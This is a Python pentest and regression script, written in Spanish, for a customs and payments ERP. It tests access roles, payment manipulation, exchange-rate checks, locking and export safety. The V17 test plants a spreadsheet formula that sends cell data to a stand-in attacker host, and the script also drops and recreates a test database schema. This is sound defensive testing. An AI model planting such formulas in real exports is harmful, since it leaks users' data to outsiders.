"""Pruebas de seguridad y regresión del ERP contra PostgreSQL."""
import os, sys, time, io, datetime, subprocess, concurrent.futures
from decimal import Decimal

# ==========================================
# 1. VALIDACIÓN DE SEGURIDAD Y ENTORNO
# ==========================================
TEST_DATABASE_URL = os.environ.get("TEST_DATABASE_URL")
if not TEST_DATABASE_URL:
    print("❌ ERROR FATAL: La variable TEST_DATABASE_URL no está definida.", file=sys.stderr)
    sys.exit(1)

# Validar que el nombre de la base de datos contenga obligatoriamente 'test'
db_name = TEST_DATABASE_URL.rsplit("/", 1)[-1].split("?")[0].lower()
if "test" not in db_name:
    print(f"❌ ERROR DE SEGURIDAD: La base de datos '{db_name}' en TEST_DATABASE_URL no contiene 'test'. Abortando inmediatamente.", file=sys.stderr)
    sys.exit(1)

# Asignar DATABASE_URL antes de importar models/main (evita que load_dotenv use el .env real)
os.environ["DATABASE_URL"] = TEST_DATABASE_URL
os.environ["SECRET_KEY"] = "test-secret-key-only-for-pentest-0123456789abcdef"
# Las pruebas validan la configuración de PRODUCCIÓN: Swagger apagado aunque el .env de desarrollo lo active
os.environ["ENABLE_DOCS"] = "false"

# REPO como la raíz del proyecto (carpeta padre de tests/)
REPO = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if REPO not in sys.path:
    sys.path.insert(0, REPO)
os.chdir(REPO)

# ==========================================
# 2. LIMPIEZA DE ESQUEMA Y MIGRACIONES ALEMBIC
# ==========================================
from sqlalchemy import create_engine, text

print(f"[SEGURIDAD] Conectando a base de pruebas: {db_name}")
engine_clean = create_engine(TEST_DATABASE_URL, isolation_level="AUTOCOMMIT")
with engine_clean.connect() as conn:
    print("[LIMPIEZA] Ejecutando: DROP SCHEMA public CASCADE; CREATE SCHEMA public;")
    conn.execute(text("DROP SCHEMA public CASCADE; CREATE SCHEMA public;"))
engine_clean.dispose()

def _ejecutar(paso, args):
    r = subprocess.run([sys.executable, *args], cwd=REPO, capture_output=True, text=True, env=os.environ)
    if r.returncode != 0:
        print("\n" + "=" * 70)
        print(f"❌ FALLÓ: {paso}")
        print((r.stderr or r.stdout).strip())
        print("=" * 70 + "\n")
        sys.exit(2)
    print(f"✅ {paso}")
    return (r.stdout or "") + (r.stderr or "")

# a) Base vacía -> esquema completo + marca en la última migración (receta oficial de Alembic)
_ejecutar("[INIT_DB] scripts/init_db.py (create_all + alembic stamp head)", ["scripts/init_db.py", "--url", TEST_DATABASE_URL])
# b) La cadena de migraciones debe quedar sin pendientes (verifica que 'head' es único y coherente)
_ejecutar("[ALEMBIC] alembic upgrade head (debe ser no-op)", ["-m", "alembic", "upgrade", "head"])
# c) Los modelos deben coincidir con el esquema creado (detecta columnas sin migración en models.py)
_ejecutar("[ALEMBIC] alembic check (models.py == esquema)", ["-m", "alembic", "check"])

# ==========================================
# 3. CARGA DE LA APLICACIÓN Y TESTCLIENT
# ==========================================
import models, main
from database import engine, SessionLocal, Base
from security import create_access_token, get_password_hash
from dependencies import limiter
from fastapi.testclient import TestClient

c = TestClient(main.app)
R = []

def res(id_, titulo, vulnerable, evidencia):
    R.append((id_, titulo, vulnerable, evidencia))
    print(f"[{'VULNERABLE' if vulnerable else 'OK        '}] {id_} {titulo}\n      -> {evidencia}")

db = SessionLocal()
for i, n in [(1, "Admin"), (2, "Logistica"), (3, "Tesoreria"), (4, "Auditor")]:
    db.add(models.CatRol(id_rol=i, nombre=n))
db.flush()
users = {}
for i, n in [(1, "admin"), (2, "logi"), (3, "teso"), (4, "audi")]:
    u = models.Usuario(id_rol=i, username=n, email=f"{n}@x.test", hashed_password=get_password_hash("Clave123!"), is_active=True)
    db.add(u); db.flush(); users[n] = u.id_usuario
imp = models.CatImportador(nombre="IMP A", ruc="20000000001"); imp2 = models.CatImportador(nombre="IMP B", ruc="20000000002")
prov = models.CatProveedor(nombre="SUNAT", categoria="ESTADO_O_TRIBUTO")
banco = models.CatBanco(nombre="BCP")
doc = models.CatalogoDocumentoPago(nombre_documento="FACTURA", multiplicador_financiero=1)
c_trib = models.CatConceptoPago(nombre="TRIBUTOS"); c_perc = models.CatConceptoPago(nombre="PERCEPCION"); c_otro = models.CatConceptoPago(nombre="FLETE LOCAL")
db.add_all([imp, imp2, prov, banco, doc, c_trib, c_perc, c_otro]); db.commit()

def tok(n):
    u = db.query(models.Usuario).filter_by(username=n).first()
    return {"Authorization": "Bearer " + create_access_token({"sub": n, "id_rol": u.id_rol, "id_usuario": u.id_usuario})}
H = {n: tok(n) for n in users}

def mk_maestro(fact, tipo="DEFINITIVO"):
    r = c.post("/maestros/", json={"numero_factura": fact, "id_importador": imp.id_importador, "tipo_valor": tipo}, headers=H["logi"]); return r.json()["id_maestro"]
def mk_dam(idm, num, canal="VERDE"):
    r = c.post("/dams/", json={"id_maestro": idm, "numero_de_dam": num, "canal_control": canal}, headers=H["logi"]); return r.json()["id_dam"]
def mk_gasto(idd, concepto, monto, moneda="USD", doc_n=None):
    r = c.post("/gastos/", json={"id_dam": idd, "id_concepto": concepto, "id_proveedor": prov.id_proveedor, "id_tipo_doc": doc.id_tipo_doc,
                                  "monto_original": str(monto), "moneda": moneda, "numero_documento": doc_n}, headers=H["logi"])
    return r.json()["id_gasto"]
def mk_voucher(monto, moneda="USD", importador=None, num="OP1"):
    r = c.post("/vouchers/", json={"banco_id": banco.id_banco, "id_importador": importador or imp.id_importador, "numero_operacion": num,
                                    "monto_total": str(monto), "moneda": moneda, "fecha_transferencia": str(datetime.date.today())}, headers=H["teso"])
    return r.json()
def pagar(gasto, voucher, importe, origen, moneda="USD", tc="1.00", who="teso", extra=None):
    body = {"id_gasto": gasto, "voucher_id": voucher, "moneda": moneda, "importe": str(importe), "tipo_cambio": str(tc), "monto_moneda_origen": str(origen)}
    return c.post("/pagos/", json=body, headers={**H[who], **(extra or {})})
def voucher(idv):
    db.expire_all(); return db.get(models.VoucherBancario, idv)
def dam(idd):
    db.expire_all(); return db.get(models.DetalleDam, idd)
def gasto(idg):
    db.expire_all(); return db.get(models.RegistroGasto, idg)

def chk(id_, titulo, cond, evid):
    R.append((id_, titulo, cond, evid))
    print(f"[{'PASA ' if cond else 'FALLA'}] {id_} {titulo}\n      -> {evid}")

def pagar2(gasto_, voucher_, importe, moneda="USD", tc="1.00", who="teso", cruzada=False, origen=None, extra=None):
    body = {"id_gasto": gasto_, "voucher_id": voucher_, "moneda": moneda, "importe": str(importe), "tipo_cambio": str(tc),
            "pago_moneda_cruzada": cruzada, "monto_moneda_origen": (str(origen) if origen is not None else None)}
    return c.post("/pagos/", json=body, headers={**H[who], **(extra or {})})

def det(r):
    try:
        return str(r.json().get("detail", ""))[:110]
    except Exception:
        return r.text[:110]

print("\n=========== A) ATAQUES CRÍTICOS (deben ser RECHAZADOS) ===========")
m = mk_maestro("F-V01"); d = mk_dam(m, "DAM-V01", "ROJO")
r = c.put(f"/dams/{d}", json={"estado_dam": "CON LEVANTE", "aforo_realizado": True}, headers=H["audi"])
chk("V01a", "Auditor no puede tocar DAMs", r.status_code == 403 and dam(d).estado_dam == "NUMERADA / EN EVALUACIÓN", f"{r.status_code} estado={dam(d).estado_dam}")
r = c.put(f"/dams/{d}", json={"estado_dam": "CON LEVANTE"}, headers=H["logi"])
chk("V01b", "Logística no puede saltar NUMERADA -> CON LEVANTE", r.status_code == 400, f"{r.status_code} {det(r)}")
r = c.post("/dams/", json={"id_maestro": m, "numero_de_dam": "DAM-V01-B", "estado_dam": "CON LEVANTE", "aforo_realizado": True, "fecha_levante": "2026-01-01"}, headers=H["logi"])
chk("V01c", "Crear DAM ignora estado/aforo/fecha_levante enviados", r.status_code == 200 and r.json()["estado_dam"] == "NUMERADA / EN EVALUACIÓN" and not r.json()["aforo_realizado"], f"{r.status_code} {r.json().get('estado_dam')}")

m = mk_maestro("F-V02"); d = mk_dam(m, "DAM-V02"); g = mk_gasto(d, c_trib.id_concepto, 5000)
r = c.post("/pagos/", json={"id_gasto": g, "moneda": "USD", "importe": "5000", "tipo_cambio": "1", "monto_moneda_origen": "5000"}, headers=H["teso"])
chk("V02", "Pago sin voucher rechazado", r.status_code == 422 and gasto(g).estado_pago == "PENDIENTE", f"{r.status_code} gasto={gasto(g).estado_pago}")

m = mk_maestro("F-V03"); d = mk_dam(m, "DAM-V03"); g = mk_gasto(d, c_otro.id_concepto, 100); v = mk_voucher(100, num="OP-V03")
r = pagar2(g, v["id_voucher"], "0.01", cruzada=True, origen="-50000")
r2 = pagar2(g, v["id_voucher"], "-5")
chk("V03", "Montos negativos rechazados", r.status_code == 422 and r2.status_code == 422 and voucher(v["id_voucher"]).saldo_disponible == Decimal("100.00"), f"{r.status_code}/{r2.status_code} saldo={voucher(v['id_voucher']).saldo_disponible}")

m = mk_maestro("F-V04"); d = mk_dam(m, "DAM-V04"); g = mk_gasto(d, c_otro.id_concepto, 1000); v = mk_voucher(1000, num="OP-V04")
r = c.post("/pagos/", json={"id_gasto": g, "voucher_id": v["id_voucher"], "moneda": "USD", "importe": "1000", "tipo_cambio": "1", "monto_moneda_origen": "0.01"}, headers=H["teso"])
chk("V04a", "monto_moneda_origen del cliente ignorado sin cruzada (débito real = 1000)", r.status_code == 200 and voucher(v["id_voucher"]).saldo_disponible == Decimal("0.00"), f"{r.status_code} saldo={voucher(v['id_voucher']).saldo_disponible}")
m = mk_maestro("F-V04b"); d = mk_dam(m, "DAM-V04b"); g = mk_gasto(d, c_otro.id_concepto, 1000); v = mk_voucher(1000, num="OP-V04b")
r = pagar2(g, v["id_voucher"], 1000, cruzada=True, origen="0.01")
chk("V04b", "Débito cruzado muy por debajo del teórico rechazado", r.status_code == 400, f"{r.status_code} {det(r)}")

m = mk_maestro("F-V05"); d = mk_dam(m, "DAM-V05"); g = mk_gasto(d, c_otro.id_concepto, 1000); v = mk_voucher(10, "PEN", num="OP-V05")
r = pagar2(g, v["id_voucher"], 10, "PEN", "0.01")
chk("V05a", "TC 0.01 rechazado (banda 2.50-5.50)", r.status_code == 400, f"{r.status_code} {det(r)}")
db.add(models.HistorialTipoCambio(fecha=datetime.date.today(), precio_compra=Decimal("3.74"), precio_venta=Decimal("3.75"))); db.commit()
r = pagar2(g, v["id_voucher"], 10, "PEN", "4.50")
chk("V05b", "TC fuera de +-5% del oficial SUNAT del día rechazado", r.status_code == 400, f"{r.status_code} {det(r)}")

m = mk_maestro("F-V06"); d = mk_dam(m, "DAM-V06"); g = mk_gasto(d, c_otro.id_concepto, 100); v = mk_voucher(100, num="OP-V06")
p = pagar2(g, v["id_voucher"], 100).json()
r1 = c.put(f"/pagos/{p['id_pago']}", json={"monto_moneda_origen": "90000"}, headers=H["audi"])
r2 = c.put(f"/pagos/{p['id_pago']}", json={"monto_moneda_origen": "90000"}, headers=H["teso"])
r3 = c.put(f"/pagos/{p['id_pago']}", json={"id_gasto": 1}, headers=H["admin"])
chk("V06/V07", "Edición financiera de pagos bloqueada (auditor 403, tesorería/admin 422)", (r1.status_code, r2.status_code, r3.status_code) == (403, 422, 422), f"{r1.status_code}/{r2.status_code}/{r3.status_code}")

m = mk_maestro("F-V08"); d = mk_dam(m, "DAM-V08"); g = mk_gasto(d, c_otro.id_concepto, 100); v = mk_voucher(100, num="OP-V08")
a = c.put(f"/gastos/{g}", json={"monto_original": "1"}, headers=H["audi"]).status_code
b = c.put(f"/vouchers/{v['id_voucher']}", json={"monto_total": "999999"}, headers=H["audi"]).status_code
t = c.put(f"/gastos/{g}", json={"monto_original": "1"}, headers=H["teso"]).status_code
chk("V08 (parcial)", "Auditor no edita gastos ni vouchers; Tesorería no cambia montos de gastos", (a, b, t) == (403, 403, 403), f"{a}/{b}/{t}")

m = mk_maestro("F-V11"); d = mk_dam(m, "DAM-V11"); g = mk_gasto(d, c_otro.id_concepto, 100); g2 = mk_gasto(d, c_otro.id_concepto, 300, doc_n="X-9"); v = mk_voucher(1000, num="OP-V11")
r1 = pagar2(g, v["id_voucher"], 50, extra={"Idempotency-Key": "k-1"}); r2 = pagar2(g2, v["id_voucher"], 300, who="admin", extra={"Idempotency-Key": "k-1"})
chk("V11", "Idempotency-Key aislada por usuario (el pago del 2do usuario se procesa)", r2.status_code == 200 and r2.json()["id_gasto"] == g2 and gasto(g2).estado_pago == "PAGADO", f"2do -> gasto {r2.json().get('id_gasto')} {gasto(g2).estado_pago}")

print("\n=========== B) REGRESIÓN: FLUJOS LEGÍTIMOS (deben FUNCIONAR) ===========")
m = mk_maestro("F-R1"); d = mk_dam(m, "DAM-R1", "VERDE")
gt = mk_gasto(d, c_trib.id_concepto, 5000, doc_n="T-R1"); gp = mk_gasto(d, c_perc.id_concepto, 800, doc_n="P-R1"); v = mk_voucher(6000, num="OP-R1")
chk("R1a", "Proforma registrada -> PENDIENTE PAGO PROFORMA", dam(d).estado_dam == "PENDIENTE PAGO PROFORMA", dam(d).estado_dam)
a = pagar2(gt, v["id_voucher"], 5000); b = pagar2(gp, v["id_voucher"], 800)
chk("R1b", "Canal VERDE: pagar proforma con voucher -> CON LEVANTE y voucher descontado exacto", a.status_code == b.status_code == 200 and dam(d).estado_dam == "CON LEVANTE" and voucher(v["id_voucher"]).saldo_disponible == Decimal("200.00"), f"DAM={dam(d).estado_dam} saldo={voucher(v['id_voucher']).saldo_disponible}")
r = c.put(f"/maestros/{m}", json={"status_llegada": "EN ALMACÉN", "fecha_recepcion_almacen": str(datetime.date.today())}, headers=H["logi"])
db.expire_all(); est = db.get(models.MaestroImportacion, m).estado_documentario
chk("R1c", "Ingreso a almacén -> ATE. TOTAL", est == "ATE. TOTAL", est)
r = c.put(f"/dams/{d}", json={"serie": "X"}, headers=H["logi"])
chk("R1d", "DAM de contenedor en ATE. TOTAL bloqueada para Logística", r.status_code == 403, str(r.status_code))

m = mk_maestro("F-R2"); d = mk_dam(m, "DAM-R2", "ROJO")
gt = mk_gasto(d, c_trib.id_concepto, 100, doc_n="T-R2"); gp = mk_gasto(d, c_perc.id_concepto, 10, doc_n="P-R2")
pagar2(gt, v["id_voucher"], 100); pagar2(gp, v["id_voucher"], 10)
chk("R2a", "Canal ROJO: tras proforma -> PENDIENTE DE AFORO", dam(d).estado_dam == "PENDIENTE DE AFORO", dam(d).estado_dam)
r = c.put(f"/dams/{d}", json={"estado_dam": "CON LEVANTE"}, headers=H["logi"])
chk("R2b", "Botón 'Aforo Conforme' -> CON LEVANTE + aforo_realizado", r.status_code == 200 and dam(d).estado_dam == "CON LEVANTE" and dam(d).aforo_realizado, f"{r.status_code} {dam(d).estado_dam} aforo={dam(d).aforo_realizado}")
db.expire_all(); log = db.query(models.AuditLog).filter_by(accion="CAMBIO ESTADO DAM").order_by(models.AuditLog.id_log.desc()).first()
chk("R2c", "Cambio de estado DAM queda en bitácora", log is not None and "PENDIENTE DE AFORO" in log.detalles, log.detalles if log else "sin log")
r = c.put(f"/dams/{d}", json={"numero_de_dam": "DAM-R2", "serie": "S1", "canal_control": "ROJO", "estado_dam": "CON LEVANTE"}, headers=H["logi"])
chk("R2d", "Guardar formulario completo de DAM (estado sin cambios) sigue funcionando", r.status_code == 200, str(r.status_code))

m = mk_maestro("F-R3", "GARANTIZADO")
rd = c.post("/dams/", json={"id_maestro": m, "numero_de_dam": "DAM-R3", "canal_control": "ROJO", "monto_valor_provisional_usd": "100"}, headers=H["logi"]); d = rd.json()["id_dam"]
gt = mk_gasto(d, c_trib.id_concepto, 10, doc_n="T-R3"); gp = mk_gasto(d, c_perc.id_concepto, 10, doc_n="P-R3"); v = mk_voucher(100, num="OP-R3")
pagar2(gt, v["id_voucher"], 10); pagar2(gp, v["id_voucher"], 10)
s = [c.put(f"/dams/{d}", json={"estado_dam": e}, headers=H["logi"]).status_code for e in ["OBSERVADA / NOTIFICADA", "CON LEVANTE (GARANTÍA ACTIVA)", "EN REVISIÓN OMC (POST-LEVANTE)", "GARANTÍA CERRADA / LIQUIDADA"]]
chk("R3", "Flujo GARANTIZADO (observación -> garantía -> OMC -> liquidada)", s == [200, 200, 200, 200] and dam(d).estado_dam == "GARANTÍA CERRADA / LIQUIDADA", f"{s} {dam(d).estado_dam}")

m = mk_maestro("F-R4"); d = mk_dam(m, "DAM-R4"); g = mk_gasto(d, c_otro.id_concepto, 375, "PEN"); v = mk_voucher(1000, "PEN", num="OP-R4")
r = pagar2(g, v["id_voucher"], 375, "PEN", "3.75")
chk("R4", "Gasto PEN con voucher PEN descuenta S/ 375 (antes descontaba 100 = 375/3.75)", r.status_code == 200 and voucher(v["id_voucher"]).saldo_disponible == Decimal("625.00"), f"saldo={voucher(v['id_voucher']).saldo_disponible}")

m = mk_maestro("F-R5"); d = mk_dam(m, "DAM-R5"); g = mk_gasto(d, c_otro.id_concepto, 1000, "USD"); v = mk_voucher(10000, "PEN", num="OP-R5")
r = pagar2(g, v["id_voucher"], "3754.30", "PEN", "3.7543")
pg = r.json()
chk("R5", "Gasto USD desde voucher PEN con TC 3.7543 (4 decimales conservados)", r.status_code == 200 and gasto(g).estado_pago == "PAGADO" and str(pg.get("tipo_cambio_aplicado")).startswith("3.7543"), f"{r.status_code} {gasto(g).estado_pago} tc_aplicado={pg.get('tipo_cambio_aplicado')} saldo={voucher(v['id_voucher']).saldo_disponible}")

m = mk_maestro("F-R6"); d = mk_dam(m, "DAM-R6"); g = mk_gasto(d, c_otro.id_concepto, 100, "USD"); v = mk_voucher(1000, "PEN", num="OP-R6")
r = pagar2(g, v["id_voucher"], 100, "USD", "3.75", cruzada=True, origen="380.00")
pg = r.json()
chk("R6", "Moneda cruzada: USD 100 al 3.75 con débito bancario S/ 380 -> diferencia S/ 5", r.status_code == 200 and Decimal(str(pg.get("gasto_financiero_tc"))) == Decimal("5.00") and voucher(v["id_voucher"]).saldo_disponible == Decimal("620.00"), f"{r.status_code} dif={pg.get('gasto_financiero_tc')} saldo={voucher(v['id_voucher']).saldo_disponible} {det(r) if r.status_code != 200 else ''}")

m = mk_maestro("F-R7"); d = mk_dam(m, "DAM-R7"); g = mk_gasto(d, c_otro.id_concepto, "100.03"); v = mk_voucher(1000, num="OP-R7")
r = pagar2(g, v["id_voucher"], "100.00")
db.expire_all(); zd = db.query(models.RegistroPago).filter_by(id_gasto=g, es_ajuste_sistema=True).first()
chk("R7", "Ajuste ZD por centavos sigue cerrando el gasto", r.status_code == 200 and gasto(g).estado_pago == "PAGADO" and zd is not None, f"{gasto(g).estado_pago} zd={'sí' if zd else 'no'}")

m = mk_maestro("F-R8"); d = mk_dam(m, "DAM-R8"); g = mk_gasto(d, c_otro.id_concepto, 200); v = mk_voucher(500, num="OP-R8")
p = pagar2(g, v["id_voucher"], 200).json()
rd = c.request("DELETE", f"/pagos/{p['id_pago']}", json={"motivo": "anulación de prueba"}, headers=H["teso"])
chk("R8", "Anular pago devuelve exactamente el débito al voucher", rd.status_code == 200 and voucher(v["id_voucher"]).saldo_disponible == Decimal("500.00") and gasto(g).estado_pago == "PENDIENTE", f"saldo={voucher(v['id_voucher']).saldo_disponible} gasto={gasto(g).estado_pago}")

m = mk_maestro("F-R9"); d = mk_dam(m, "DAM-R9"); g = mk_gasto(d, c_otro.id_concepto, 200); v = mk_voucher(500, num="OP-R9")
a = pagar2(g, v["id_voucher"], 50, extra={"Idempotency-Key": "doble-clic"}); b = pagar2(g, v["id_voucher"], 50, extra={"Idempotency-Key": "doble-clic"})
chk("R9", "Doble clic con misma clave = un solo cobro", a.json()["id_pago"] == b.json()["id_pago"] and voucher(v["id_voucher"]).saldo_disponible == Decimal("450.00"), f"saldo={voucher(v['id_voucher']).saldo_disponible}")

a = c.put(f"/gastos/{g}", json={"observaciones": "nota de tesorería"}, headers=H["teso"]).status_code
nuevo = pagar2(g, v["id_voucher"], 10).json()["id_pago"]
b = c.put(f"/pagos/{nuevo}", json={"fecha_pago": "2026-11-01"}, headers=H["teso"]).status_code
chk("R10", "Tesorería edita observaciones de gasto y fecha de pago", (a, b) == (200, 200), f"{a}/{b}")

r = c.get("/pagos/", headers=H["audi"]); r2 = c.get("/gastos/", headers=H["audi"])
chk("R11", "Listados de pagos y gastos siguen respondiendo (Auditor lee)", r.status_code == r2.status_code == 200, f"{r.status_code}/{r2.status_code}")

print("\n=========== C) HALLAZGOS ALTOS / MEDIOS (fase 2) ===========")
# V08: matriz RBAC
m = mk_maestro("F-N1")
cods = {
    "audi POST /maestros": c.post("/maestros/", json={"numero_factura": "F-AUDI-N"}, headers=H["audi"]).status_code,
    "audi PUT /maestros": c.put(f"/maestros/{m}", json={"tipo_valor": "GARANTIZADO"}, headers=H["audi"]).status_code,
    "teso PUT /maestros": c.put(f"/maestros/{m}", json={"n_cont_fisico": "X"}, headers=H["teso"]).status_code,
    "audi POST /bancos": c.post("/bancos/", json={"nombre": "BANCO FALSO"}, headers=H["audi"]).status_code,
    "audi PUT /conceptos": c.put(f"/conceptos/{c_otro.id_concepto}", json={"nombre": "TRIBUTOS FALSOS"}, headers=H["audi"]).status_code,
    "audi DELETE /importadores": c.request("DELETE", f"/importadores/{imp2.id_importador}", headers=H["audi"]).status_code,
    "audi PUT /tipos-documento": c.put(f"/tipos-documento/{doc.id_tipo_doc}", json={"multiplicador_financiero": -1}, headers=H["audi"]).status_code,
    "teso PUT /conceptos": c.put(f"/conceptos/{c_otro.id_concepto}", json={"descripcion": "x"}, headers=H["teso"]).status_code,
    "logi POST /bancos": c.post("/bancos/", json={"nombre": "BANCO LOGI"}, headers=H["logi"]).status_code,
}
ok_esperado = {
    "logi POST /proveedores": c.post("/proveedores/", json={"nombre": "PROV LOGI"}, headers=H["logi"]).status_code,
    "teso POST /bancos": c.post("/bancos/", json={"nombre": "BANCO TESO"}, headers=H["teso"]).status_code,
    "logi PUT /conceptos": c.put(f"/conceptos/{c_otro.id_concepto}", json={"descripcion": "ok"}, headers=H["logi"]).status_code,
    "audi GET /bancos": c.get("/bancos/", headers=H["audi"]).status_code,
}
chk("V08", "Matriz RBAC: Auditor sin escritura; cada rol solo en su ámbito",
    all(v == 403 for v in cods.values()) and all(v == 200 for v in ok_esperado.values()),
    f"denegados={[k for k, v in cods.items() if v == 403].__len__()}/{len(cods)} {cods if not all(v == 403 for v in cods.values()) else ''} permitidos={ok_esperado}")

# V12: bloqueo optimista
m = mk_maestro("F-N2")
ver = c.get("/maestros/", params={"search": "F-N2"}, headers=H["logi"]).json()["data"][0]["version"]
a = c.put(f"/maestros/{m}", json={"n_cont_fisico": "USUARIA-A", "version": ver}, headers=H["logi"])
b = c.put(f"/maestros/{m}", json={"n_cont_fisico": "USUARIA-B (vieja)", "version": ver}, headers=H["admin"])
cc = c.put(f"/maestros/{m}", json={"n_cont_fisico": "USUARIA-B (recargó)", "version": a.json()["version"]}, headers=H["admin"])
chk("V12", "Versión obsoleta -> 409; versión vigente -> 200", (a.status_code, b.status_code, cc.status_code) == (200, 409, 200), f"{a.status_code}/{b.status_code}/{cc.status_code} final={cc.json().get('n_cont_fisico')}")

v = mk_voucher(500, num="OP-N3"); vver = v["version"]
gN3 = mk_gasto(mk_dam(mk_maestro("F-N3"), "DAM-N3"), c_otro.id_concepto, 10)
pagar2(gN3, v["id_voucher"], 10)  # el pago incrementa la versión del voucher
r = c.put(f"/vouchers/{v['id_voucher']}", json={"numero_operacion": "OP-N3-EDIT", "version": vver}, headers=H["teso"])
chk("V12b", "Voucher editado con versión anterior a un pago -> 409", r.status_code == 409, f"{r.status_code}")

# V09: voucher duplicado
d1 = mk_voucher(100, num="OP-DUP-N"); r = c.post("/vouchers/", json={"banco_id": banco.id_banco, "id_importador": imp.id_importador, "numero_operacion": " op-dup-n ", "monto_total": "100", "moneda": "USD", "fecha_transferencia": str(datetime.date.today())}, headers=H["teso"])
banco2 = c.post("/bancos/", json={"nombre": "INTERBANK"}, headers=H["teso"]).json()["id_banco"]
r2 = c.post("/vouchers/", json={"banco_id": banco2, "id_importador": imp.id_importador, "numero_operacion": "OP-DUP-N", "monto_total": "100", "moneda": "USD", "fecha_transferencia": str(datetime.date.today())}, headers=H["teso"])
r3 = c.post("/vouchers/", json={"banco_id": banco.id_banco, "id_importador": imp.id_importador, "numero_operacion": "OP-FUT", "monto_total": "100", "moneda": "USD", "fecha_transferencia": "2099-01-01"}, headers=H["teso"])
chk("V09", "Mismo N° operación en mismo banco rechazado (ignora mayúsculas/espacios); otro banco OK; fecha futura rechazada",
    (r.status_code, r2.status_code, r3.status_code) == (400, 200, 400), f"{r.status_code}/{r2.status_code}/{r3.status_code}")

# V14: Logística no revierte pagos
m = mk_maestro("F-N5"); d = mk_dam(m, "DAM-N5"); g = mk_gasto(d, c_otro.id_concepto, 100); v = mk_voucher(100, num="OP-N5"); pagar2(g, v["id_voucher"], 100)
a = c.request("DELETE", f"/gastos/{g}?forzar_reversion_pagos=true", json={"motivo": "logistica borra pagos"}, headers=H["logi"])
b = c.request("DELETE", f"/gastos/{g}?forzar_reversion_pagos=true", json={"motivo": "admin autoriza reversion"}, headers=H["admin"])
chk("V14", "Logística no puede revertir pagos (403); Admin sí (200) y el voucher recupera saldo", (a.status_code, b.status_code) == (403, 200) and voucher(v["id_voucher"]).saldo_disponible == Decimal("100.00"), f"{a.status_code}/{b.status_code} saldo={voucher(v['id_voucher']).saldo_disponible}")

# V13: candados ATE. TOTAL + fecha de recepción
m = mk_maestro("F-N6"); d = mk_dam(m, "DAM-N6", "VERDE")
gt = mk_gasto(d, c_trib.id_concepto, 10, doc_n="T-N6"); gp = mk_gasto(d, c_perc.id_concepto, 10, doc_n="P-N6"); v = mk_voucher(100, num="OP-N6")
pt = pagar2(gt, v["id_voucher"], 10).json(); pagar2(gp, v["id_voucher"], 10)
sin_fecha = c.put(f"/maestros/{m}", json={"status_llegada": "EN ALMACÉN"}, headers=H["logi"]).status_code
c.put(f"/maestros/{m}", json={"status_llegada": "EN ALMACÉN", "fecha_recepcion_almacen": str(datetime.date.today())}, headers=H["logi"])
db.expire_all(); est = db.get(models.MaestroImportacion, m).estado_documentario
dp = c.request("DELETE", f"/pagos/{pt['id_pago']}", json={"motivo": "intento en ATE TOTAL"}, headers=H["teso"]).status_code
dg = c.request("DELETE", f"/gastos/{gt}", json={"motivo": "intento en ATE TOTAL"}, headers=H["logi"]).status_code
dd = c.request("DELETE", f"/dams/{d}", json={"motivo": "intento en ATE TOTAL"}, headers=H["logi"]).status_code
chk("V13", "EN ALMACÉN exige fecha (400); en ATE. TOTAL no se anulan pagos/gastos/DAMs (403)", (sin_fecha, est, dp, dg, dd) == (400, "ATE. TOTAL", 403, 403, 403), f"sin_fecha={sin_fecha} estado={est} pago={dp} gasto={dg} dam={dd}")

m = mk_maestro("F-N7"); d = mk_dam(m, "DAM-N7", "ROJO")
gt = mk_gasto(d, c_trib.id_concepto, 10, doc_n="T-N7"); gp = mk_gasto(d, c_perc.id_concepto, 10, doc_n="P-N7")
r = c.put(f"/maestros/{m}", json={"tipo_valor": "GARANTIZADO"}, headers=H["logi"])
chk("V13b", "No se cambia DEFINITIVO->GARANTIZADO con DAMs en trámite (400)", r.status_code == 400, f"{r.status_code} {det(r)}")
r = c.post("/maestros/", json={"numero_factura": "F-N7b", "estado_documentario": "ATE. TOTAL", "estado_levante": "CON LEVANTE"}, headers=H["logi"])
chk("V13c", "Crear maestro ignora estado_documentario/estado_levante del cliente", r.status_code == 200 and r.json()["estado_documentario"] == "SIN NUMERAR" and r.json()["estado_levante"] == "SIN LEVANTE", f"{r.status_code} {r.json().get('estado_documentario')}/{r.json().get('estado_levante')}")

# V17: fórmulas en Excel
m = mk_maestro("F-N9"); d = mk_dam(m, "DAM-N9")
c.post("/gastos/", json={"id_dam": d, "id_concepto": c_otro.id_concepto, "id_proveedor": prov.id_proveedor, "id_tipo_doc": doc.id_tipo_doc, "monto_original": "1",
                         "observaciones": '=HYPERLINK("http://atacante.test/?d="&A1,"Ver")'}, headers=H["logi"])
import openpyxl
r = c.get("/gastos/exportar", params={"search": "DAM-N9"}, headers=H["audi"])
wb = openpyxl.load_workbook(io.BytesIO(r.content)); tipos = []; guiones_ok = True
for ws in wb.worksheets:
    for row in ws.iter_rows():
        for cell in row:
            if isinstance(cell.value, str) and "HYPERLINK" in cell.value:
                tipos.append(cell.data_type)
            if cell.value == "'-":
                guiones_ok = False
chk("V17", "Texto con '=' se exporta como texto, no fórmula", tipos and all(t == "s" for t in tipos) and guiones_ok, f"tipos={tipos} marcadores '-' intactos={guiones_ok}")

# V18: tiempo de login
from dependencies import limiter
limiter.enabled = False
def t(u):
    s = time.perf_counter(); c.post("/login", data={"username": u, "password": "mala"}); return time.perf_counter() - s
te = sum(t("admin") for _ in range(4)) / 4; tn = sum(t("noexiste") for _ in range(4)) / 4
limiter.enabled = True
chk("V18", "Login tarda lo mismo exista o no el usuario", 0.5 < (tn / te) < 2, f"existe={te*1000:.0f} ms / no existe={tn*1000:.0f} ms")

# V20: política de usuarios
w = c.post("/usuarios/", json={"id_rol": 1, "username": "nuevo1", "email": "no-es-email", "password": "1"}, headers=H["admin"]).status_code
x = c.post("/usuarios/", json={"id_rol": 9, "username": "nuevo2", "email": "a@b.pe", "password": "ClaveSegura123"}, headers=H["admin"]).status_code
y = c.post("/usuarios/", json={"id_rol": 3, "username": "teso2", "email": "Teso2@Empresa.PE", "password": "ClaveSegura123"}, headers=H["admin"])
chk("V20", "Clave débil/email inválido/rol inexistente -> 422; usuario válido -> 200", (w, x, y.status_code) == (422, 422, 200), f"{w}/{x}/{y.status_code} email={y.json().get('email')}")

# V21: docs
chk("V21", "Swagger y OpenAPI ocultos por defecto", (c.get("/docs").status_code, c.get("/openapi.json").status_code) == (404, 404), f"{c.get('/docs').status_code}/{c.get('/openapi.json').status_code}")

# V15: fuga de errores
from services.errores import error_interno
from sqlalchemy.exc import IntegrityError
e1 = error_interno("Error al crear gasto", Exception('relation "registro_gastos" SELECT secret_col'))
